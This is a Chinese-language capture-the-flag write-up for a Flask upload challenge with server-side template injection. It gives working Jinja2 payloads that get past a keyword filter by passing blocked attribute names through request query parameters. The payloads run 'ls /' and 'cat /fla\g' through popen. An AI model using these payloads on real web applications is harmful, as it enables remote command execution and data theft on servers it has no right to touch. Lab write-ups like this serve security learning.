## 基本信息

- 题目名称：GHCTF 2025-upload SSTI!
- 题目链接：https://www.nssctf.cn/problem/6529
- 考点清单：SSTI、WAF绕过、flask
- 工具清单：Yakit
- payloads：WAF绕过


### 解题思路

看起来是一个文件上传，但是题目已经说明了这道题的考点，随便上传一个文件，可以看到上传的路径

![](images/GHCTF%202025-upload%20SSTI!-filepath.png)

在附件给的源码中也可以看到一些关于SSTI的过滤关键词

![](images/GHCTF%202025-upload%20SSTI!-code.png)

写一个`{{7*7}}`，观察注入结果

![](images/GHCTF%202025-upload%20SSTI!-test.png)

成功验证SSTI的存在

### 过程和结果记录

这题的重点在于如何绕过waf，关键词过滤了`'_', 'os', 'subclasses', '__builtins__', '__globals__','flag'`

有一篇博客总结的很好：[SSTI进阶 | 沉铝汤的破站](https://chenlvtang.top/2021/03/31/SSTI%E8%BF%9B%E9%98%B6/)

这里我们可以使用`request`传递被拦截的关键词：
```
{{""[request.args.class][request.args.mro][1][request.args.subclass]()[137][request.args.init][request.args.globals]['popen']('ls /').read()}}
```

访问URL，使用get传递参数：
```
http://node1.anna.nssctf.cn:28415/file/test.txt?class=__class__&mro=__mro__&subclass=__subclasses__&init=__init__&globals=__globals__
```

可以看到根目录的文件列表

![](images/GHCTF%202025-upload%20SSTI!-ls.png)

对于关键词`flag`的绕过有很多方法，比如使用`*`模糊匹配或者反斜杠`\`

构造如下的payload查看flag：
```
{{""[request.args.class][request.args.mro][1][request.args.subclass]()[137][request.args.init][request.args.globals]['popen']('cat /fla\g').read()}}
```

![](images/GHCTF%202025-upload%20SSTI!-flag.png)

### 总结

- 大部分SSTI题目的关键在于找到合适的类和绕过waf的方法，需要总结关于绕过waf的各种方法，包括但不限于函数关键字、特殊字符`{{`、`[`、`_`等，可以通过靶场SSTI-labs进行练习。